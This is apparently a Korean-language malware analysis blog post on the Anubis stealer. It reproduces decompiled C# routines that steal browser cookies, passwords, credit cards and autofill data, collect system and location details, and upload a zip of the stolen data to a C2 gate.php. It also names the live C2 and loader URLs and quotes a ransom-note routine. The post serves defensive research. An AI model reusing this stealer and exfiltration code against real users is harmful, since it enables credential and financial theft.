---
title: "Anubis Stealer: 악성코드 분석"
date: 2021-01-01
description: "Anubis 뱅킹 트로이/스틸러의 정적·동적 분석: 지속성 메커니즘, C2 통신, 자격증명 탈취 기법"
tags: ["malware", "stealer", "Anubis", "banking-trojan", "reverse-engineering", "analysis"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 샘플 정보

**MD5:** `9664ef2d82e819afa20e5411e0855027`

![PE 파일 정보](/images/blog/anubis-stealer-analysis/Untitled.png)

PE32 바이너리이며 C#(.NET)으로 작성되어 있다. JetBrains dotPeek 같은 .NET 디컴파일러를 사용하면 메인 제어 흐름을 쉽게 추적할 수 있다.

---

## 실행 흐름

### 1. 임시 작업 디렉토리 생성

![임시 디렉토리 생성](/images/blog/anubis-stealer-analysis/Untitled 1.png)
![임시 디렉토리 구조](/images/blog/anubis-stealer-analysis/Untitled 2.png)

악성코드는 가장 먼저 사용자의 임시 디렉토리를 가져와 그 아래에 `AX754VD.tmp` 하위 디렉토리를 만든다. 수집한 데이터를 이곳에 임시 보관한 뒤 나중에 C2 서버로 전송한다.

### 2. 웹캠 캡처

![웹캠 캡처 코드](/images/blog/anubis-stealer-analysis/Untitled 3.png)
![웹캠 캡처 결과](/images/blog/anubis-stealer-analysis/Untitled 4.png)

`Get_webcam()` 함수는 캡처 창을 생성하고 현재 웹캠 프레임을 `CamScreen.png`로 저장한다.

### 3. 스크린샷 캡처

![스크린샷 코드](/images/blog/anubis-stealer-analysis/Untitled 5.png)

활성화된 데스크탑 화면을 캡처하여 `screen.jpeg`로 저장한다.

### 4. 데이터 수집

![데이터 수집 개요](/images/blog/anubis-stealer-analysis/Untitled 6.png)

스틸러가 수집하는 데이터 목록은 다음과 같다:

- **FileZilla** — 자격증명 및 접속 프로필
- **바탕화면 파일** — `txt`, `doc`, `cs`, `cpp`, `dat`, `docx`, `log`, `sql` 확장자 파일
- **Mozilla 사용자 데이터** — `AppData\Local\Mozilla` 경로
- **Bitcoin 지갑** 데이터
- **Loader** — `https://anubiscode.fun/test/panel/loader.php`를 내려받아 `svhost.exe`라는 이름으로 숨겨진 프로세스로 실행하고, 수집된 데이터를 전송한다

### 5. 브라우저 자격증명 탈취

`Get_agent()` 함수는 Windows 레지스트리에서 버전 정보를 읽어 설치된 각 브라우저(Chrome, Opera, Firefox)의 User-Agent 문자열을 수집한다:

```csharp
public static void Get_agent(string dir)
{
    UserAgents.GetOSBit();
    UserAgents.NT = UserAgents.GetNTVersion();
    string[] strArray = UserAgents.NT.Split('.');
    string str1 = string.Empty;
    if (((IEnumerable<string>) strArray).Contains<string>("10"))
        str1 = "Windows NT 10.0";
    if (strArray.Length > 1 && !((IEnumerable<string>) strArray).Contains<string>("10"))
        str1 = "Windows NT " + strArray[0] + "." + strArray[1];
    try
    {
        using (StreamWriter streamWriter = new StreamWriter(dir + "\\UserAgents.txt"))
        {
            if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
            {
                object obj = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", (object) null);
                string str2 = obj == null
                    ? FileVersionInfo.GetVersionInfo(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", (object) null).ToString()).FileVersion
                    : FileVersionInfo.GetVersionInfo(obj.ToString()).FileVersion;
                if (UserAgents.razr == "x64")
                    streamWriter.WriteLine("Mozilla/5.0 (" + str1 + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str2 + " Safari/537.36");
                else
                    streamWriter.WriteLine("Mozilla/5.0 (" + str1 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str2 + " Safari/537.36");
            }
            // Opera와 Firefox도 동일하게 처리...
        }
    }
}
```

Opera의 경우 레지스트리에서 버전을 읽어온 뒤 버전 번호를 Chromium 버전으로 매핑하는 별도 로직이 있다. Firefox는 `C:\Program Files\Mozilla Firefox\firefox.exe` 존재 여부를 먼저 확인한다.

이후 `Parse()` 함수가 모든 브라우저 프로필을 순회하면서 전용 추출 루틴을 호출한다:

```csharp
public static void Parse(string dir)
{
    Directory.CreateDirectory(dir + "\\Browsers");
    Steal.Cookies();
    try
    {
        foreach (string fileName in Browser_Parse.GetProfile())
        {
            try
            {
                string fullName = new FileInfo(fileName).Directory.FullName;
                string str1 = fileName.Contains(Browser_Parse.RoamingAppData)
                    ? Browser_Parse.GetRoadData(fullName)
                    : Browser_Parse.GetLclName(fullName);
                if (!string.IsNullOrEmpty(str1))
                {
                    string str2 = str1[0].ToString().ToUpper() + str1.Remove(0, 1);
                    string name = Browser_Parse.GetName(fullName);
                    GetCookies.Cookie_Grab(fullName, str2, name);        // 쿠키
                    GetPasswords.Passwords_Grab(fullName, str2, name);   // 비밀번호
                    GetPasswords.Write_Passwords();
                    Get_Credit_Cards.Get_CC(fullName, str2, name);       // 신용카드
                    Get_Credit_Cards.Write_CC(str2, name);
                    Get_Browser_Autofill.Get_Autofill(fullName, str2, name); // 자동완성
                    Get_Browser_Autofill.Write_Autofill(str2, name);
                }
            }
        }
    }
}
```

각 브라우저 프로필별로 쿠키, 저장된 비밀번호, 신용카드 정보, 자동완성 데이터를 모두 추출한다.

### 6. 시스템 정보 수집

WMI와 `http://ip-api.com/line/?fields`를 통해 하드웨어 및 지리위치 데이터를 수집한다:

```csharp
public static void Info(string dir)
{
    object obj1 = (object) 0;
    foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
        obj1 = managementBaseObject["NumberOfLogicalProcessors"];

    string id = Identification.GetId();
    string str1 = loki.loki.Utilies.Hardware.Hardware.Define_windows();
    string end;
    using (WebResponse response = WebRequest.Create("http://ip-api.com/line/?fields").GetResponse())
    {
        using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
            end = streamReader.ReadToEnd();
    }
    // ...
    using (StreamWriter streamWriter1 = new StreamWriter(dir + "\\information.log"))
    {
        streamWriter1.WriteLine("IP : " + strArray[13]);
        streamWriter1.WriteLine("Country : " + strArray[1]);
        streamWriter1.WriteLine("Country Code : " + strArray[2]);
        streamWriter1.WriteLine("State Name : " + strArray[4]);
        streamWriter1.WriteLine("City : " + strArray[5]);
        streamWriter1.WriteLine("Timezone : " + strArray[9]);
        streamWriter1.WriteLine("ZIP : " + strArray[6]);
        streamWriter1.WriteLine("ISP : " + strArray[10]);
        streamWriter1.WriteLine("Coordinates : " + strArray[7] + " , " + strArray[8]);
        streamWriter1.WriteLine("Username : " + Environment.UserName);
        streamWriter1.WriteLine("PCName : " + Environment.MachineName);
        streamWriter1.WriteLine("HWID : " + id);
        streamWriter1.WriteLine("OS : " + str1);
        streamWriter1.WriteLine("CPU : " + obj2?.ToString());
        streamWriter1.WriteLine("GPU : " + obj4?.ToString());
        streamWriter1.WriteLine("MAC : " + obj3?.ToString());
        // 화면 해상도, 언어, 브라우저 버전 등...
    }
}
```

수집 항목:
- IP 주소, 국가, 도시, ISP, 좌표 (ip-api.com 기반)
- 사용자 이름, PC 이름, UUID, HWID
- OS, CPU, GPU, RAM, MAC 주소
- 화면 해상도, 시스템 언어, 레이아웃 언어
- 설치된 브라우저 버전

### 7. 데이터 유출

![압축 및 업로드](/images/blog/anubis-stealer-analysis/Untitled 7.png)

임시 디렉토리에 모인 파일 전체를 `<국가>_<IP>_<HWID>.zip` 이름으로 압축하고 C2 서버에 업로드한다:

```csharp
ZipFile.CreateFromDirectory(dir, Path.GetTempPath() + "\\" + strArray[1] + "_" + strArray[13] + "_" + id + ".zip");
try
{
    new WebClient().UploadFile(
        Settings.Url + string.Format(
            "gate.php?id={0}&wlt={1}&cki={2}&pwd={3}&cc={4}&frm={5}&hwid={6}",
            (object) 1,
            (object) Crypto.count,
            (object) GetCookies.CCookies,
            (object) GetPasswords.Cpassword,
            (object) Get_Credit_Cards.CCCouunt,
            (object) Get_Browser_Autofill.AutofillCount,
            (object) id),
        "POST",
        Path.GetTempPath() + "\\" + strArray[1] + "_" + strArray[13] + "_" + id + ".zip");
}
catch (Exception ex)
{
    Console.WriteLine(ex.ToString());
}
File.Delete(Path.GetTempPath() + "\\" + strArray[1] + "_" + strArray[13] + "_" + id + ".zip");
```

`gate.php`의 쿼리 파라미터에 탈취 요약 정보(쿠키 수, 비밀번호 수, 신용카드 수, 자동완성 수, HWID)를 함께 전송한다. 공격자 패널 대시보드에서 피해 현황을 한눈에 파악하기 위한 구조다.

업로드 이후 로컬의 ZIP 파일은 즉시 삭제된다.

### 8. 정리 및 랜섬웨어 투하

![정리](/images/blog/anubis-stealer-analysis/Untitled 8.png)
![랜섬 노트](/images/blog/anubis-stealer-analysis/Untitled 9.png)

유출이 완료되면 임시 작업 디렉토리를 삭제한다. 이후 랜섬 노트를 투하하고 MessageBox를 표시한다:

```csharp
File.WriteAllText(
    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt",
    "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Russian Paradise stealer:"
    + crypt.AESDecript(Settings.Stealer_version)
    + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel
    + "\n- Follow All Steps",
    Encoding.UTF8);
Thread.Sleep(2000);
int num = (int) MessageBox.Show(
    "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Russian Paradise stealer: "
    + Settings.Stealer_version
    + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel
    + "\n - Follow All Steps");
Process.Start(
    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
    + "\\HowToDecrypt.txt");
```

바이너리 이름은 "Anubis"인데 랜섬 노트에는 "Russian Paradise stealer"라고 적혀 있다. 이 불일치는 이 악성코드가 다른 랜섬웨어 킷에서 파생되었거나 함께 판매된 것임을 시사한다.

---

## 요약

| 단계 | 기법 |
|---|---|
| 준비 | `%TEMP%\AX754VD.tmp` 작업 디렉토리 생성 |
| 정찰 | 웹캠 캡처, 스크린샷, ip-api.com을 통한 IP 지리위치 수집 |
| 자격증명 탈취 | Chrome/Opera/Firefox에서 쿠키, 비밀번호, 신용카드, 자동완성 추출 |
| 파일 수집 | 바탕화면의 문서 파일 수집 (txt, doc, cs, cpp 등) |
| Bitcoin 탈취 | 지갑 데이터 수집 |
| 추가 페이로드 | 숨겨진 `svhost.exe`를 C2 Loader URL에서 내려받아 실행 |
| 데이터 유출 | ZIP 압축 후 `gate.php`에 POST 업로드 (쿼리 파라미터에 탈취 요약 포함) |
| 정리 | 임시 ZIP 파일 삭제 |
| 랜섬웨어 | `HowToDecrypt.txt` 투하, MessageBox 표시, 0.02 BTC 요구 |

**C2:** `https://anubiscode.fun/test/panel/` (loader + gate 엔드포인트)
